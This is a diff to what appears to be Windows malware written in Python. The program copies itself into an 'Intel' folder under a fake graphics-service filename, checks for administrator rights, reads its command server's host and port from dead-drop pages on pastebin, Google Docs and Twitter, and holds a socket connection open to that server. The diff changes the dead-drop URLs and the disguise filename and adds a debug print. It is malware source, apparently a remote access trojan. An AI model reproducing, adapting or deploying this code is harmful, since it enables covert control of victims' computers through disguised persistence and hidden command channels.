@@ -20,7 +20,7 @@ import base64
 import urllib
 import shutil
 
-url_list = ['https://mobile.twitter.com/ModeratorCanada',]
+url_list = ['http://pastebin.com/raw/HMV0Hy2B', 'https://docs.google.com/document/d/1a8KtmOEq9cldSTfzO3DoNcjG7gDPV6w4HwSNUkNOvHc', 'https://twitter.com/kaurikasd']
 ACTIVE = False
 _SHGetFolderPath = windll.shell32.SHGetFolderPathW
 _SHGetFolderPath.argtypes = [wintypes.HWND, ctypes.c_int, wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR]
@@ -29,10 +29,10 @@ result = _SHGetFolderPath(0, 35, 0, 0, path_buf)
 destination_folder = os.path.join(path_buf.value, 'Intel')
 if not os.path.exists(destination_folder):
     os.makedirs(destination_folder)
-destination_path = os.path.join(destination_folder, 'igfxsrvc.exe')
+destination_path = os.path.join(destination_folder, 'IntelGFX.exe')
 file_name = sys.argv[0]
 
-if not 'igfxsrvc' in file_name:
+if not 'IntelGFX' in file_name:
     if not os.path.exists(destination_path):
         shutil.copy2(file_name, destination_path)
     if windll.shell32.IsUserAnAdmin() == 1:
@@ -119,6 +119,7 @@ while 1:
                 req = urllib.urlopen(url).read()
                 start = req.index('#!#!#!') + 6; end = req.index('#?#?#?')
                 HOST, PORT = req[start:end].split(':')
+                print HOST, PORT
                 break
             except:
                 continue
@@ -150,5 +151,5 @@ while 1:
             del GLOBAL_SOCKET
             time.sleep(6)
     except socket.error as e:
-        # TODO: TIMOUT
+        # TODO: TIMEOUT
         time.sleep(5)
